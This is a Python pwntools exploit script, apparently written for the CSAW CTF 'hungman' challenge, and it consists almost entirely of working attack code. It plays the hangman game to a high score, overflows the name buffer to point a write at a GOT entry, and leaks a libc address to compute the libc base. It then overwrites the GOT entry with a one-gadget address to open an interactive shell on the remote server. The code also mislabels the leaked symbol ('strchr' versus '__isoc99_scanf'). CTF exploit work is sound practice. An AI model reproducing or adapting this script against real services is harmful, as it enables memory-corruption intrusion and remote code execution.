from pwn import *

'''
s = process("./hungman")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
bespokes = [0xF07F0, 0x0F16BD, 0x0442AA]
'''
s = remote("pwn.chal.csaw.io",8003)
libc = ELF("./libc-2.23.so")
bespokes = [0,0xF0897]

name = "A"*15
s.sendline(name)

s.recvuntil(name)
s.recvline()

buf = s.recvline() 
while not buf.count("High score!"):
	buf = "_"
	i = 0x61 
	while buf.count("_"):
		s.sendline("%c" % i)
		i += 1
		buf = s.recvline()
		print "--> %s" % buf
	print "Endded attempt"


#bash stuff
s.sendline("y")
newname = "B"*0x20+ p32(100)+ p32(20)+p64(0x602098) # score + len + write got entry
s.sendline(newname)

s.recvuntil(": ")
strchr= u64(s.recvuntil(" score")[:-6].ljust(8,"\x00"))

print hex(strchr)
libcbase = strchr-libc.symbols['__isoc99_scanf']
system = libcbase + libc.symbols['system']

s.sendline("y")

s.recvline()
buf = s.recvline() 
while not buf.count("High score!"):
	buf = "_"
	i = 0x61 
	while buf.count("_"):
		s.sendline("%c" % i)
		i += 1
		buf = s.recvline()
		print "--> %s" % buf
	print "Endded attempt"

s.sendline("y")
system = libcbase+bespokes[1]
print hex(system)
s.sendline(p64(system))
s.interactive()
